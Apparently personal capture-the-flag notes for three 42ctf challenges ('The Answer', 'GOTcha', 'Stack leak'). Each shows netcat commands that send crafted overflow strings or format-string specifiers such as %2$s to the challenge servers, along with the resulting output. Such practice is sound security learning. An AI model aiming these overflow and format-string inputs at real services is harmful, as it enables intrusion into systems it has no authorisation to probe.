## The Answer
```sh
# could not find offset
# bruteforced it

$ (x=40; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done; echo -n "*";) | nc challenges.42ctf.org 3001
```
## GOTcha
```sh
# 72 a's

$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc challenges.42ctf.org 3003

. . .
Gimme a trusted input plz:
sh: 1: ??1?I??^H??H???PTI???@: not found
. . .
```
## Stack leak
```r
$ nc challenges.42ctf.org 3006
What is the flag?
%3%s        
%s is not the flag!

$ nc challenges.42ctf.org 3006
What is the flag?
%1$s
%1$s is not the flag!

$ nc challenges.42ctf.org 3006
What is the flag?
%2$s    
(null) is not the flag! 
```